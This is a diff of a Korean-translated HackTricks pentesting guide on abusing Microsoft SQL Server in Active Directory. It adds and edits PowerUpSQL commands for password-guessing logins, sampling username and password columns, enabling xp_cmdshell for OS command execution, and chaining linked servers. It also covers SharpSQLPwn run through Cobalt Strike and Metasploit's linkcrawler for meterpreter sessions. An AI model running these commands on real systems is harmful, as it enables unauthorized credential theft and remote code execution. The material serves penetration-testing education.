@@ -1,4 +1,4 @@
-# MSSQL AD 남용
+# MSSQL AD Abuse
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -91,11 +91,11 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ###  Powershell
 
 이 경우에 powershell 모듈 [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)이 매우 유용합니다.
-```powershell
+```bash
 Import-Module .\PowerupSQL.psd1
 ````
 ### 도메인 세션 없이 네트워크에서 열거하기
-```powershell
+```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
@@ -109,7 +109,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
 ### 도메인 내부에서 열거하기
-```powershell
+```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
@@ -117,6 +117,12 @@ Get-SQLInstanceLocal | Get-SQLServerInfo
 #Get info about valid MSQL instances running in domain
 #This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
 Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
+
+# Try dictionary attack to login
+Invoke-SQLAuditWeakLoginPw
+
+# Search SPNs of common software and try the default creds
+Get-SQLServerDefaultLoginPw
 
 #Test connections with each one
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
@@ -130,11 +136,23 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ## MSSQL 기본 악용
 
 ### 데이터베이스 접근
-```powershell
+```bash
+# List databases
+Get-SQLInstanceDomain | Get-SQLDatabase
+
+# List tables in a DB you can read
+Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName
+
+# List columns in a table
+Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName
+
+# Get some sample data from a column in a table (columns username & passwor din the example)
+Get-SQLInstanceDomain | GetSQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10
+
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
 
-#Dump an instance (a lotof CVSs generated in current dir)
+#Dump an instance (a lot of CVSs generated in current dir)
 Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
 
 # Search keywords in columns trying to access the MSSQL DBs
@@ -144,7 +162,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ### MSSQL RCE
 
 MSSQL 호스트 내에서 **명령을 실행**하는 것도 가능할 수 있습니다.
-```powershell
+```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
@@ -158,12 +176,12 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 ## MSSQL 신뢰 링크
 
-MSSQL 인스턴스가 다른 MSSQL 인스턴스에 의해 신뢰받는 경우(데이터베이스 링크). 사용자가 신뢰된 데이터베이스에 대한 권한이 있는 경우, 그는 **신뢰 관계를 사용하여 다른 인스턴스에서도 쿼리를 실행할 수 있습니다**. 이러한 신뢰는 연결될 수 있으며, 어느 시점에서 사용자는 명령을 실행할 수 있는 잘못 구성된 데이터베이스를 찾을 수 있습니다.
+MSSQL 인스턴스가 다른 MSSQL 인스턴스에 의해 신뢰받는 경우(데이터베이스 링크). 사용자가 신뢰된 데이터베이스에 대한 권한을 가지고 있다면, 그는 **신뢰 관계를 사용하여 다른 인스턴스에서도 쿼리를 실행할 수 있습니다**. 이러한 신뢰는 연결될 수 있으며, 어느 시점에서 사용자는 명령을 실행할 수 있는 잘못 구성된 데이터베이스를 찾을 수 있습니다.
 
 **데이터베이스 간의 링크는 포리스트 신뢰를 넘어 작동합니다.**
 
 ### Powershell 남용
-```powershell
+```bash
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
 
@@ -194,6 +212,12 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 ## If you see the results of @@selectname, it worked
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
+또 다른 유사한 도구는 [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):
+```bash
+SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
+# Cobalt Strike
+inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
+```
 ### Metasploit
 
 metasploit을 사용하여 신뢰할 수 있는 링크를 쉽게 확인할 수 있습니다.
@@ -202,13 +226,13 @@ metasploit을 사용하여 신뢰할 수 있는 링크를 쉽게 확인할 수 �
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-metasploit이 MSSQL에서 `openquery()` 함수만 악용하려고 시도한다는 점에 유의하세요 (따라서 `openquery()`로 명령을 실행할 수 없다면, 아래에서 더 자세히 설명하는 `EXECUTE` 방법을 **수동으로** 시도해야 합니다.)
+메타스플로잇은 MSSQL에서 `openquery()` 함수만을 악용하려고 시도할 것입니다 (따라서, `openquery()`로 명령을 실행할 수 없다면, 아래에서 더 자세히 설명하는 `EXECUTE` 방법을 **수동으로** 시도해야 합니다.)
 
 ### 수동 - Openquery()
 
-**Linux**에서 **sqsh**와 **mssqlclient.py**를 사용하여 MSSQL 콘솔 셸을 얻을 수 있습니다.
+**리눅스**에서 **sqsh**와 **mssqlclient.py**를 사용하여 MSSQL 콘솔 셸을 얻을 수 있습니다.
 
-**Windows**에서도 링크를 찾아 수동으로 명령을 실행할 수 있습니다 **MSSQL 클라이언트인** [**HeidiSQL**](https://www.heidisql.com)을 사용하여.
+**윈도우**에서도 링크를 찾아 수동으로 명령을 실행할 수 있으며, **MSSQL 클라이언트**로 [**HeidiSQL**](https://www.heidisql.com)을 사용할 수 있습니다.
 
 _윈도우 인증을 사용하여 로그인:_
 
@@ -228,11 +252,11 @@ EXEC sp_linkedservers;
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 > [!WARNING]
-> 더블 및 싱글 인용부호가 사용되는 위치를 확인하세요. 이렇게 사용하는 것이 중요합니다.
+> 더블 및 싱글 인용부호가 사용되는 위치를 확인하세요. 그렇게 사용하는 것이 중요합니다.
 
 ![](<../../images/image (643).png>)
 
-이 신뢰할 수 있는 링크 체인을 수동으로 영원히 계속할 수 있습니다.
+이 신뢰할 수 있는 링크 체인을 수동으로 무한히 계속할 수 있습니다.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
